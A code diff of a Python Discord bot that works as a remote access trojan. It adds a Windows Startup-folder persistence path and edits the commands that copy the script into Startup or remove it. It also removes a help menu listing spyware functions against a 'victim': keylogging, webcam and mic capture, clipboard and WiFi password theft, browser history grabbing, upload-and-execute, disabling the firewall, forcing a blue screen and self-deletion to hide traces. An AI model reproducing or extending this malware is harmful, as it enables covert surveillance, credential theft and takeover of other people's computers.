@@ -60,6 +60,10 @@ intents = discord.Intents.all()
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
+startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+script_name = os.path.basename(__file__)
+startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup", script_name)
+
 
 def send_to_webhook(content):
     try:
@@ -766,12 +770,11 @@ async def screenoff(ctx):
 @bot.command()
 async def startup(ctx):
     if os.path.exists(startup_path):
-        embed = discord.Embed(title="Already in Startup", description="The script is already set to run on startup.", color=0xFFFF00)
+        await ctx.send("The script is already set to run on startup.")
     else:
         shutil.copy(__file__, startup_path)
-        embed = discord.Embed(title="Startup Enabled", description="The script will now run on startup.", color=0x3498DB)
-    embed.set_footer(text="Creds to OrangeWare for making this command.")
-    await ctx.send(embed=embed)
+        await ctx.send(f"The script `{script_name}` will now run on startup.")
+
 
 @bot.command()
 async def rstartup(ctx):
@@ -780,9 +783,12 @@ async def rstartup(ctx):
         if file == script_name:
             os.remove(os.path.join(startup_folder, file))
             found = True
-    embed = discord.Embed(title="Startup Removed", description="The script was removed from startup." if found else "The script is not in the startup folder.", color=0x3498DB if found else 0xFF0000)
-    embed.set_footer(text="Command by OrangeWare")
-    await ctx.send(embed=embed)
+    
+    
+    if found:
+        await ctx.send("The script was removed from startup.")
+    else:
+        await ctx.send("The script is not in the startup folder.")
 
 @bot.command()
 async def shutdown(ctx):
@@ -843,49 +849,6 @@ async def bye(ctx):
     file_path = sys.argv[0]
     os.remove(file_path)
     await bot.close()
-
-@bot.command()
-async def cmds(ctx):
-    embed = discord.Embed(title="Command List", description="Here are all available commands:", color=0xFF0000)  # Red color
-    embed.add_field(name="!webcam", value="Take an image of the webcam and send it", inline=False)
-    embed.add_field(name="!screenshot", value="Takes a screenshot of the victim's monitor and sends it", inline=False)
-    embed.add_field(name="!clipboard", value="Takes the content of the victim's clipboard and sends it", inline=False)
-    embed.add_field(name="!browser", value="Takes browser history of Chrome and Edge", inline=False)
-    embed.add_field(name="!delete (file path)", value="Deletes file in that certain path", inline=False)
-    embed.add_field(name="!download (file path)", value="Sends file to Discord", inline=False)
-    embed.add_field(name="!tts message", value="Plays a message on the victim's screen", inline=False)
-    embed.add_field(name="!ip", value="Grabs the victim's PUBLIC IP and geolocates it", inline=False)
-    embed.add_field(name="!hwid", value="Takes the victim's HWID", inline=False)
-    embed.add_field(name="!jumpscare", value="Shows the image scarylarry.png on their screen", inline=False)
-    embed.add_field(name="!mic", value="Logs past 30 seconds of the victim's mic and sends a wav file", inline=False)
-    embed.add_field(name="!wifi", value="Takes WiFi Passwords", inline=False)
-    embed.add_field(name="!upload(file)", value="Uploads and executes a file on the victim's PC", inline=False)
-    embed.add_field(name="!fakeerror", value="Shows a fake error (no limit, can be spammed)", inline=False)
-    embed.add_field(name="!start", value="Starts keylogger", inline=False)
-    embed.add_field(name="!stop", value="Stops keylogger", inline=False)
-    embed.add_field(name="!specs", value="Get PC specs", inline=False)
-    embed.add_field(name="!name", value="Get monitor and PC username", inline=False)
-    embed.add_field(name="!discord", value="Gets Discord username (useless imo)", inline=False)
-    embed.add_field(name="!screen_record", value="Records screen for 30 seconds", inline=False)
-    embed.add_field(name="!network_adapter", value="Disables WiFi (admin required)", inline=False)
-    embed.add_field(name="!disable_firewall", value="Disables firewall (admin required)", inline=False)
-    embed.add_field(name="!shutdown", value="Shuts down PC", inline=False)
-    embed.add_field(name="!screenoff", value="Turns off the victim's screen for 30 seconds", inline=False)
-    embed.add_field(name="!startup", value="Actually adds to startup", inline=False)
-    embed.add_field(name="!goon", value="Opens The Hub multiple times", inline=False)
-    embed.add_field(name="!processes", value="Lists all processes", inline=False)
-    embed.add_field(name="!kill (pid)", value="Kills processes", inline=False)
-    embed.add_field(name="!bsod", value="Executes blue screen of death", inline=False)
-    embed.add_field(name="!bye", value="Deletes file off PC to hide traces", inline=False)
-    embed.add_field(name="!rstartup", value="Removes from startup", inline=False)
-    
-    embed.set_footer(text="CMDS INSPIRED BY ORANGEWARE)
-    
-    await ctx.send(embed=embed)
-
-
-
-
 
 
 
